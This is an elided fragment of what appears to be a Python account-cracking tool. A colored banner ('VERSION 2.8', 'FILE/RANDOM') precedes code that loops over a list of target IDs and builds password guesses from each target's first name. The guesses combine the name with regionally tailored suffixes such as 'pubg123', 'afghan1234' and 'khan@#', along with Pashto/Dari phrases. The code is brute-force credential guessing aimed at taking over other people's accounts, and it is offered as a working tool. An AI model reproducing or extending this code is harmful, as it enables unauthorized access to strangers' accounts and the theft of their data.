...
\033[1;39m╠======================================================
\033[1;39m║ VERSION   \33[1;91m    ❂     \x1b[38;5;48m2.8\33[1;92m                   
\033[1;39m║ TOOLS    \33[1;91m     ❂    \x1b[38;5;208m 𝐅𝐈𝐋𝐄/𝐑𝐀𝐍𝐃𝐎𝐌                  
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append(frs+'pubg123')
                    pwv.append(frs+'afghan1234')
                    pwv.append(frs+'password12345')
                    pwv.append(frs+'king500500')
                    pwv.append(nmf)
                    pwv.append('فافجی فافجی')
                    pwv.append(frs+'افغانستان فافجی')
                    pwv.append(frs+'khan@#')
                    pwv.append(frs+'pubg@@')
                    pwv.append(frs+'Afghan@@@')
                    pwv.append(frs+'@#%')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'786')
                ...
                if len(frs)<3:
                    ...
                    pwv.append(frs+'رحمان بابا')
                    pwv.append(frs+'احمدشاه ابدالی')
                    pwv.append(frs+'غنی بابا')
                    pwv.append(frs+'pubgking')
                    pwv.append(nmf)
                    pwv.append('pubgpubg')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    ...
                    pwv.append(frs+'pubg@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'pubg Afghanistan')
                    pwv.append(frs+'000')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
